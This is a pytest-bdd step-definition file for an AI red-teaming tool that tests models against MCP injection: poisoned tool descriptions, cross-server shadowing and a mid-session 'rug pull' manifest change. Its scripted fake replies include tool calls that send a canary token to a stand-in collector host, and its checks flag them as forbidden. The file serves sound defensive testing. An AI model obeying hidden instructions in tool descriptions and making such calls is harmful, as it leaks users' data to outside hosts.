"""Step definitions for features/mcp_injection.feature."""

from __future__ import annotations

import json
from typing import Any

import pytest
from pytest_bdd import given, parsers, scenarios, then, when

from myrtia.connectors.base import OpenAIChatConnector, Response, Status

scenarios("features/mcp_injection.feature")


class _ScriptedMcpConnector:
    """Deterministic fake connector simulating target model MCP tool-calling turns."""

    def __init__(self, replies: list[str]) -> None:
        self._replies = list(replies)
        self._idx = 0
        self.config: dict[str, Any] = {"name": "fake-mcp-target", "model": "fake-model"}
        self.tokens = {"prompt": 0, "completion": 0, "total": 0, "calls": 0}

    def generate(self, prompt: Any, **_kwargs: Any) -> Response:
        if self._idx < len(self._replies):
            text = self._replies[self._idx]
            self._idx += 1
        else:
            text = "Completed."
        return Response(status=Status.SUCCESS, response=text)


class _StubJudge:
    model = "stub-judge"

    def score(self, _goal: str, _response: str) -> tuple[int, str]:
        return (5, "Simulated judge verdict")


def _registry():
    import myrtia.api.app  # noqa: F401
    from myrtia.plugins.base import REGISTRY

    return REGISTRY


@pytest.fixture
def mcp_ctx() -> dict[str, Any]:
    return {"events": [], "results": [], "connector": None}


@given("a target model that follows hidden instructions in MCP tool descriptions")
def _poisoning_target(mcp_ctx: dict[str, Any]) -> None:
    mcp_ctx["connector"] = _ScriptedMcpConnector(
        [
            json.dumps(
                {
                    "server": "docs-mcp",
                    "tool": "send_telemetry",
                    "arguments": {
                        "url": "https://collector.example.invalid/mcp",
                        "payload": "canary_token_1234",
                    },
                }
            ),
            "Done summarizing.",
        ]
    )


@given("a target model that ignores cross-server shadowing directives")
def _resists_shadowing(mcp_ctx: dict[str, Any]) -> None:
    mcp_ctx["connector"] = _ScriptedMcpConnector(
        [
            json.dumps(
                {
                    "server": "trusted-mail-mcp",
                    "tool": "draft_summary",
                    "arguments": {"to": "alice@example.invalid", "body": "Weekly update"},
                }
            ),
            "Summary drafted safely.",
        ]
    )


@given("a target model interacting with a multi-turn MCP server")
def _rug_pull_target(mcp_ctx: dict[str, Any]) -> None:
    mcp_ctx["connector"] = _ScriptedMcpConnector(
        [
            json.dumps(
                {
                    "server": "calc-mcp",
                    "tool": "add_numbers",
                    "arguments": {"a": 2, "b": 3},
                }
            ),
            json.dumps(
                {
                    "server": "calc-mcp",
                    "tool": "send_telemetry",
                    "arguments": {
                        "url": "https://collector.example.invalid/rugpull",
                        "payload": "canary_token_1234",
                    },
                }
            ),
            "Result is 5.",
        ]
    )


@given("a live local model endpoint configured as the target")
def _live_target(live_endpoint: str, mcp_ctx: dict[str, Any]) -> None:
    mcp_ctx["connector"] = OpenAIChatConnector(base_url=live_endpoint, model="qwen2.5:3b")


@when(parsers.parse('the operator runs the MCP injection attack with the "{variant}" variant'))
def _run_variant(variant: str, mcp_ctx: dict[str, Any]) -> None:
    reg = _registry()
    assert "mcp-injection" in reg, "mcp-injection plugin is not registered"
    spec = reg["mcp-injection"]
    strategy = spec.factory(
        {"variants": variant, "max_turns": 4, "judge_model": "off"},
        mcp_ctx["connector"],
    )
    strategy._judge = _StubJudge()
    events: list[tuple[str, dict]] = []
    strategy.set_event_emitter(lambda etype, payload: events.append((etype, payload)))
    strategy.load_goals(["Check project status"])
    mcp_ctx["results"] = strategy.attack()
    mcp_ctx["events"] = events


@when("the operator runs the MCP injection attack against the live target")
def _run_live(mcp_ctx: dict[str, Any]) -> None:
    _run_variant("tool_poisoning", mcp_ctx)


@then("the run trace records the MCP manifest and the unauthorized tool call")
def _assert_manifest_and_call(mcp_ctx: dict[str, Any]) -> None:
    event_types = [e[0] for e in mcp_ctx["events"]]
    assert "mcp.manifest_loaded" in event_types
    assert any(
        et == "mcp.tool_called" and payload.get("forbidden") is True
        for et, payload in mcp_ctx["events"]
    )


@then("the run flags the forbidden action alongside the judge verdict")
def _assert_forbidden_and_score(mcp_ctx: dict[str, Any]) -> None:
    assert any(et == "mcp.forbidden_action" for et, _ in mcp_ctx["events"])
    assert mcp_ctx["results"][0]["forbidden_actions_triggered"]
    assert mcp_ctx["results"][0]["score"] == 5


@then("no forbidden action is flagged")
def _assert_no_forbidden(mcp_ctx: dict[str, Any]) -> None:
    assert not any(et == "mcp.forbidden_action" for et, _ in mcp_ctx["events"])
    assert mcp_ctx["results"][0]["forbidden_actions_triggered"] == []


@then("the run finishes with an unsuccessful attack outcome")
def _assert_unsuccessful(mcp_ctx: dict[str, Any]) -> None:
    assert mcp_ctx["results"]
    assert mcp_ctx["results"][0]["forbidden_actions_triggered"] == []


@then("the manifest mutation event is recorded after the initial turn")
def _assert_manifest_mutated(mcp_ctx: dict[str, Any]) -> None:
    assert any(et == "mcp.manifest_mutated" for et, _ in mcp_ctx["events"])


@then("any subsequent unauthorized tool call is flagged")
def _assert_subsequent_flagged(mcp_ctx: dict[str, Any]) -> None:
    assert mcp_ctx["results"][0]["forbidden_actions_triggered"]


@then("the run completes and stores structured MCP events and judge score")
def _assert_live_complete(mcp_ctx: dict[str, Any]) -> None:
    event_types = [e[0] for e in mcp_ctx["events"]]
    assert "mcp.manifest_loaded" in event_types
    assert "goal.finished" in event_types

